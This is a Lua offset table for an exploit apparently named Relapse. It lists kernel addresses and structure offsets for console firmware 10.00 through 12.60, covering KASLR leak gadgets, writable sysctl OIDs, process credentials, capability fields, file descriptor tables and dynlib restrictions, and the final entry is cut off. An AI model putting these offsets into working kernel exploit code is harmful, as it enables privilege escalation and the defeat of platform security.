--!lua

-- =====================================================================
-- relapse_offsets.lua
-- =====================================================================
-- offsets by firmware.
-- FW 9.05 remains incompatible with Relapse - missing offsets.

relapse_offset_list = {
    [{ "10.00" }] = {
        kernelData = 0x00CC0000,
        allproc = 0x03425D70,
        rootvnode = 0x03C63510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00ADF87F, retLow16 = 0xF87F },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x027A8138, kind = 0x027A814C, kindByte3 = 0x027A814F,
                arg1 = 0x027A8150, arg1Byte1 = 0x027A8151, arg1Value = 0x027A8128,
                deadSink = 0x027A8158,
            },
            b = {
                base = 0x027A8010, kind = 0x027A8024, kindByte3 = 0x027A8027,
                arg1 = 0x027A8028, arg1Value = 0x027A7F40, visible = 0x027A8060,
            },
            c = {
                base = 0x02ACADD8, kind = 0x02ACADEC, arg1 = 0x02ACADF0,
                arg1Value = 0x03BE307C, mib = {9, 8},
            },
        },
        walkCounter = { addr = 0x03BE3078, mib = {9, 7} },
        nodeMutex = 0x01A78978,
        rodataProbe = { rva = 0x0112DAE5, text = "_aio_submit_cmd\0_aio_multi_wait" },
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c40, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "10.01" }] = {
        kernelData = 0x00CC0000,
        allproc = 0x03425D70,
        rootvnode = 0x03C63510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00ADF87F, retLow16 = 0xF87F },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x027A8138, kind = 0x027A814C, kindByte3 = 0x027A814F,
                arg1 = 0x027A8150, arg1Byte1 = 0x027A8151, arg1Value = 0x027A8128,
                deadSink = 0x027A8158,
            },
            b = {
                base = 0x027A8010, kind = 0x027A8024, kindByte3 = 0x027A8027,
                arg1 = 0x027A8028, arg1Value = 0x027A7F40, visible = 0x027A8060,
            },
            c = {
                base = 0x02ACADD8, kind = 0x02ACADEC, arg1 = 0x02ACADF0,
                arg1Value = 0x03BE307C, mib = {9, 8},
            },
        },
        walkCounter = { addr = 0x03BE3078, mib = {9, 7} },
        nodeMutex = 0x01A78978,
        rodataProbe = { rva = 0x0112DB73, text = "_aio_submit_cmd\0_aio_multi_wait" },
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c40, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "10.20" }] = {
        kernelData = 0x00CC0000,
        allproc = 0x03425D70,
        rootvnode = 0x03C63510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00ADFA9F, retLow16 = 0xFA9F },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x027A8138, kind = 0x027A814C, kindByte3 = 0x027A814F,
                arg1 = 0x027A8150, arg1Byte1 = 0x027A8151, arg1Value = 0x027A8128,
                deadSink = 0x027A8158,
            },
            b = {
                base = 0x027A8010, kind = 0x027A8024, kindByte3 = 0x027A8027,
                arg1 = 0x027A8028, arg1Value = 0x027A7F40, visible = 0x027A8060,
            },
            c = {
                base = 0x02ACADD8, kind = 0x02ACADEC, arg1 = 0x02ACADF0,
                arg1Value = 0x03BE307C, mib = {9, 8},
            },
        },
        walkCounter = { addr = 0x03BE3078, mib = {9, 7} },
        nodeMutex = 0x01A78978,
        rodataProbe = { rva = 0x0112DAF5, text = "_aio_submit_cmd\0_aio_multi_wait" },
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c40, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "10.40" }] = {
        kernelData = 0x00CC0000,
        allproc = 0x03425D70,
        rootvnode = 0x03C63510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00ADFA9F, retLow16 = 0xFA9F },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x027A8138, kind = 0x027A814C, kindByte3 = 0x027A814F,
                arg1 = 0x027A8150, arg1Byte1 = 0x027A8151, arg1Value = 0x027A8128,
                deadSink = 0x027A8158,
            },
            b = {
                base = 0x027A8010, kind = 0x027A8024, kindByte3 = 0x027A8027,
                arg1 = 0x027A8028, arg1Value = 0x027A7F40, visible = 0x027A8060,
            },
            c = {
                base = 0x02ACADD8, kind = 0x02ACADEC, arg1 = 0x02ACADF0,
                arg1Value = 0x03BE307C, mib = {9, 8},
            },
        },
        walkCounter = { addr = 0x03BE3078, mib = {9, 7} },
        nodeMutex = 0x01A78978,
        rodataProbe = { rva = 0x0112DB1F, text = "_aio_submit_cmd\0_aio_multi_wait" },
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c40, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "10.60" }] = {
        kernelData = 0x00CC0000,
        allproc = 0x03425D70,
        rootvnode = 0x03C63510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00ADFA7F, retLow16 = 0xFA7F },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x027A8138, kind = 0x027A814C, kindByte3 = 0x027A814F,
                arg1 = 0x027A8150, arg1Byte1 = 0x027A8151, arg1Value = 0x027A8128,
                deadSink = 0x027A8158,
            },
            b = {
                base = 0x027A8010, kind = 0x027A8024, kindByte3 = 0x027A8027,
                arg1 = 0x027A8028, arg1Value = 0x027A7F40, visible = 0x027A8060,
            },
            c = {
                base = 0x02ACADD8, kind = 0x02ACADEC, arg1 = 0x02ACADF0,
                arg1Value = 0x03BE307C, mib = {9, 8},
            },
        },
        walkCounter = { addr = 0x03BE3078, mib = {9, 7} },
        nodeMutex = 0x01A78978,
        rodataProbe = { rva = 0x0112D569, text = "_aio_submit_cmd\0_aio_multi_wait" },
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c40, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "11.00" }] = {
        kernelData = 0x00D30000,
        allproc = 0x035A5D70,
        rootvnode = 0x03DE7510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00B52B61, retLow16 = 0x2B61 },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x02929E58, kind = 0x02929E6C, kindByte3 = 0x02929E6F,
                arg1 = 0x02929E70, arg1Byte1 = 0x02929E71, arg1Value = 0x02929E48,
                deadSink = 0x02929E78,
            },
            b = {
                base = 0x02929D30, kind = 0x02929D44, kindByte3 = 0x02929D47,
                arg1 = 0x02929D48, arg1Value = 0x02929C60, visible = 0x02929D80,
            },
            c = {
                base = 0x02C4CB18, kind = 0x02C4CB2C, arg1 = 0x02C4CB30,
                arg1Value = 0x03D670BC, mib = {9, 8},
            },
        },
        walkCounter = { addr = 0x03D670B8, mib = {9, 7} },
        nodeMutex = 0x01AF9F18,
        rodataProbe = { rva = 0x011A7ABA, text = "_aio_submit_cmd\0_aio_multi_wait" },
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c40, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "11.20" }] = {
        kernelData = 0x00D30000,
        allproc = 0x035A5D70,
        rootvnode = 0x03DE7510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00B52B61, retLow16 = 0x2B61 },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x02929E58, kind = 0x02929E6C, kindByte3 = 0x02929E6F,
                arg1 = 0x02929E70, arg1Byte1 = 0x02929E71, arg1Value = 0x02929E48,
                deadSink = 0x02929E78,
            },
            b = {
                base = 0x02929D30, kind = 0x02929D44, kindByte3 = 0x02929D47,
                arg1 = 0x02929D48, arg1Value = 0x02929C60, visible = 0x02929D80,
            },
            c = {
                base = 0x02C4CB18, kind = 0x02C4CB2C, arg1 = 0x02C4CB30,
                arg1Value = 0x03D670BC, mib = {9, 8},
            },
        },
        walkCounter = { addr = 0x03D670B8, mib = {9, 7} },
        nodeMutex = 0x01AF9F18,
        rodataProbe = { rva = 0x011A7625, text = "_aio_submit_cmd\0_aio_multi_wait" },
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c40, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "11.40" }] = {
      kernelData = 0x00d30000,
      allproc = 0x035a5d70,
      rootvnode = 0x03de7510,
    
      kaslr = {
        mode = "rtmsg2",
        retStatic = 0x00b53751,
        retLow16 = 0x3751,
      },
    
      oid = {
        originalKind = 0x80048002,
        writableKind = 0x70048002,
    
        a = {
          base = 0x02929e90,
          kind = 0x02929eac,
          kindByte3 = 0x02929eaf,
          arg1 = 0x02929eb0,
          arg1Byte1 = 0x02929eb1,
          arg1Value = 0x02929e88,
          deadSink = 0x02929eb8,
        },
    
        b = {
          base = 0x02929d68,
          kind = 0x02929d84,
          kindByte3 = 0x02929d87,
          arg1 = 0x02929d88,
          arg1Value = 0x02929ca0,
          visible = 0x02929dc0,
        },
        c = {
          base = 0x02c4cb50,
          kind = 0x02c4cb6c,
          arg1 = 0x02c4cb70,
          arg1Value = 0x03d670bc,
          mib = {9, 8},
        },
      },
    
      walkCounter = { addr = 0x03d670b8, mib = {9, 7} },
      nodeMutex = 0x035686d0,
      rodataProbe = { rva = 0x011a7c0e, text = "_aio_submit_cmd\0_aio_multi_wait" },
    
      aio = {
        waiterSize = 0x38,
        requestSize = 0x28,
        group = { num = 0x00, state = 0x08, waiters = 0x50 },
        idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
      },
    
      proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0xc40, dynlib = 0x3e8 },
      kernelPid = 0,
    
      ucred = {
        uid = 0x04,
        ruid = 0x08,
        svuid = 0x0c,
        ngroups = 0x10,
        rgid = 0x14,
        svgid = 0x18,
        sceAuthId = 0x58,
        sceCaps = 0x60,
        sceCaps1 = 0x68,
        sceAttrs = 0x80,
      },
      sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
      filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
      filedescTable = {
        nfiles = 0x00,
        ofiles = 0x08,
        entryStride = 0x30,
        fileData = 0x00,
      },
    
      pipe = {
        count = 0x00,
        ["in"] = 0x04,
        out = 0x08,
        size = 0x0c,
        buffer = 0x10,
        pair = 0xe8,
        defaultSize = 0x4000,
      },
    
      dynlib = {
        syscallStart = 0xf0,
        syscallEnd = 0xf8,
        restrictFlags = 0x118,
        libkernelRef = 0x18,
      },
    },

    [{ "11.60" }] = {
      kernelData = 0x00d30000,
      allproc = 0x035a5d70,
      rootvnode = 0x03de7510,
    
      kaslr = {
        mode = "rtmsg2",
        retStatic = 0x00b53301,
        retLow16 = 0x3301,
      },
    
      oid = {
        originalKind = 0x80048002,
        writableKind = 0x70048002,
    
        a = {
          base = 0x02929ed0,
          kind = 0x02929eec,
          kindByte3 = 0x02929eef,
          arg1 = 0x02929ef0,
          arg1Byte1 = 0x02929ef1,
          arg1Value = 0x02929ec8,
          deadSink = 0x02929ef8,
        },
    
        b = {
          base = 0x02929da8,
          kind = 0x02929dc4,
          kindByte3 = 0x02929dc7,
          arg1 = 0x02929dc8,
          arg1Value = 0x02929ce0,
          visible = 0x02929e00,
        },
        c = {
          base = 0x02c4cb90,
          kind = 0x02c4cbac,
          arg1 = 0x02c4cbb0,
          arg1Value = 0x03d670bc,
          mib = {9, 8},
        },
      },
    
      walkCounter = { addr = 0x03d670b8, mib = {9, 7} },
      nodeMutex = 0x03b77e20,
      rodataProbe = { rva = 0x011a7987, text = "_aio_submit_cmd\0_aio_multi_wait" },
    
      aio = {
        waiterSize = 0x38,
        requestSize = 0x28,
        group = { num = 0x00, state = 0x08, waiters = 0x50 },
        idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
      },
    
      proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0xc40, dynlib = 0x3e8 },
      kernelPid = 0,
    
      ucred = {
        uid = 0x04,
        ruid = 0x08,
        svuid = 0x0c,
        ngroups = 0x10,
        rgid = 0x14,
        svgid = 0x18,
        sceAuthId = 0x58,
        sceCaps = 0x60,
        sceCaps1 = 0x68,
        sceAttrs = 0x80,
      },
      sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
      filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
      filedescTable = {
        nfiles = 0x00,
        ofiles = 0x08,
        entryStride = 0x30,
        fileData = 0x00,
      },
    
      pipe = {
        count = 0x00,
        ["in"] = 0x04,
        out = 0x08,
        size = 0x0c,
        buffer = 0x10,
        pair = 0xe8,
        defaultSize = 0x4000,
      },
    
      dynlib = {
        syscallStart = 0xf0,
        syscallEnd = 0xf8,
        restrictFlags = 0x118,
        libkernelRef = 0x18,
      },
    },

    [{ "12.00" }] = {
        kernelData = 0x00D50000,
        allproc = 0x035D5E00,
        rootvnode = 0x03E27510,
    
        kaslr = { mode = "rtmsg2", retStatic = 0x00B6EC71, retLow16 = 0xEC71 },
    
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = {
                base = 0x0294b408, kind = 0x0294b41c, kindByte3 = 0x0294b41f,
                arg1 = 0x0294b420, arg1Byte1 = 0x0294b421, arg1Value = 0x0294b3f8,
                deadSink = 0x0294b428,
            },
            b = {
                base = 0x0294b2e0, kind = 0x0294b2f4, kindByte3 = 0x0294b2f7,
                arg1 = 0x0294b2f8, arg1Value = 0x0294b210,
                visible = 0x0294b330,
            },
            c = {
                base = 0x02c6e108, kind = 0x02c6e11c, arg1 = 0x02c6e120,
                arg1Value = 0x03da32bc, mib = {9, 8},
            },
        },
    
        walkCounter = { addr = 0x03da32b8, mib = {9, 7} },
        nodeMutex = 0x01b4dd78,
        rodataProbe = { rva = 0x011c8f51, text = "_aio_submit_cmd\0_aio_multi_wait" },
    
        aio = {
            waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 },
        },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c48, dynlib = 0x3e8 },
        kernelPid = 0,
    
        ucred = {
            uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80,
        },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
    
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "12.02" }] = {
        kernelData = 0x00D50000,
        allproc = 0x035D5E00,
        rootvnode = 0x03E27510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00B6EC71, retLow16 = 0xEC71 },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = { base = 0x0294B408, kind = 0x0294B41C, kindByte3 = 0x0294B41F,
                arg1 = 0x0294B420, arg1Byte1 = 0x0294B421, arg1Value = 0x0294B3F8,
                deadSink = 0x0294B428 },
            b = { base = 0x0294B2E0, kind = 0x0294B2F4, kindByte3 = 0x0294B2F7,
                arg1 = 0x0294B2F8, arg1Value = 0x0294B210, visible = 0x0294B330 },
            c = { base = 0x02C6E108, kind = 0x02C6E11C, arg1 = 0x02C6E120,
                arg1Value = 0x03DA32BC, mib = {9, 8} },
        },
        walkCounter = { addr = 0x03DA32B8, mib = {9, 7} },
        nodeMutex = 0x01B1AB78,
        rodataProbe = { rva = 0x011C8DA2, text = "_aio_submit_cmd\0_aio_multi_wait" },
        aio = { waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 } },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c48, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "12.20" }] = {
        kernelData = 0x00D50000,
        allproc = 0x035D5E00,
        rootvnode = 0x03E27510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00B6EAF1, retLow16 = 0xEAF1 },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = { base = 0x0294B408, kind = 0x0294B41C, kindByte3 = 0x0294B41F,
                arg1 = 0x0294B420, arg1Byte1 = 0x0294B421, arg1Value = 0x0294B3F8,
                deadSink = 0x0294B428 },
            b = { base = 0x0294B2E0, kind = 0x0294B2F4, kindByte3 = 0x0294B2F7,
                arg1 = 0x0294B2F8, arg1Value = 0x0294B210, visible = 0x0294B330 },
            c = { base = 0x02C6E108, kind = 0x02C6E11C, arg1 = 0x02C6E120,
                arg1Value = 0x03DA32BC, mib = {9, 8} },
        },
        walkCounter = { addr = 0x03DA32B8, mib = {9, 7} },
        nodeMutex = 0x01B1AB78,
        rodataProbe = { rva = 0x011C9013, text = "_aio_submit_cmd\0_aio_multi_wait" },
        aio = { waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 } },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c48, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "12.40" }] = {
        kernelData = 0x00D50000,
        allproc = 0x035D5E00,
        rootvnode = 0x03E27510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00B6EAF1, retLow16 = 0xEAF1 },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = { base = 0x0294B408, kind = 0x0294B41C, kindByte3 = 0x0294B41F,
                arg1 = 0x0294B420, arg1Byte1 = 0x0294B421, arg1Value = 0x0294B3F8,
                deadSink = 0x0294B428 },
            b = { base = 0x0294B2E0, kind = 0x0294B2F4, kindByte3 = 0x0294B2F7,
                arg1 = 0x0294B2F8, arg1Value = 0x0294B210, visible = 0x0294B330 },
            c = { base = 0x02C6E108, kind = 0x02C6E11C, arg1 = 0x02C6E120,
                arg1Value = 0x03DA32BC, mib = {9, 8} },
        },
        walkCounter = { addr = 0x03DA32B8, mib = {9, 7} },
        nodeMutex = 0x01B1AB78,
        rodataProbe = { rva = 0x011C8E15, text = "_aio_submit_cmd\0_aio_multi_wait" },
        aio = { waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 } },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c48, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
        dynlib = { syscallStart = 0xf0, syscallEnd = 0xf8, restrictFlags = 0x118, libkernelRef = 0x18 },
    },

    [{ "12.60" }] = {
        kernelData = 0x00D50000,
        allproc = 0x035D5E00,
        rootvnode = 0x03E27510,
        kaslr = { mode = "rtmsg2", retStatic = 0x00B6EB51, retLow16 = 0xEB51 },
        oid = {
            originalKind = 0x80048002,
            writableKind = 0x70048002,
            a = { base = 0x0294B408, kind = 0x0294B41C, kindByte3 = 0x0294B41F,
                arg1 = 0x0294B420, arg1Byte1 = 0x0294B421, arg1Value = 0x0294B3F8,
                deadSink = 0x0294B428 },
            b = { base = 0x0294B2E0, kind = 0x0294B2F4, kindByte3 = 0x0294B2F7,
                arg1 = 0x0294B2F8, arg1Value = 0x0294B210, visible = 0x0294B330 },
            c = { base = 0x02C6E108, kind = 0x02C6E11C, arg1 = 0x02C6E120,
                arg1Value = 0x03DA32BC, mib = {9, 8} },
        },
        walkCounter = { addr = 0x03DA32B8, mib = {9, 7} },
        nodeMutex = 0x01B1AB78,
        rodataProbe = { rva = 0x011C8E92, text = "_aio_submit_cmd\0_aio_multi_wait" },
        aio = { waiterSize = 0x38, requestSize = 0x28,
            group = { num = 0x00, state = 0x08, waiters = 0x50 },
            idTable = { pages = 0x220, slotStride = 0x30, entryType = 0x160 } },
        proc = { pid = 0x0bc, ucred = 0x040, fd = 0x048, aioInfo = 0x0c48, dynlib = 0x3e8 },
        kernelPid = 0,
        ucred = { uid = 0x04, ruid = 0x08, svuid = 0x0c, ngroups = 0x10, rgid = 0x14, svgid = 0x18,
            sceAuthId = 0x58, sceCaps = 0x60, sceCaps1 = 0x68, sceAttrs = 0x80 },
        sysCoreAuthId = { lo = 0x00000007, hi = 0x48000000 },
        filedesc = { files = 0x00, cdir = 0x08, rdir = 0x10, jdir = 0x18 },
        filedescTable = { nfiles = 0x00, ofiles = 0x08, entryStride = 0x30, fileData = 0x00 },
        pipe = { count = 0x00, ["in"] = 0x04, out = 0x08, size = 0x0c, buffer = 0x10, pair = 0xe8, defaultSize = 0x4000 },
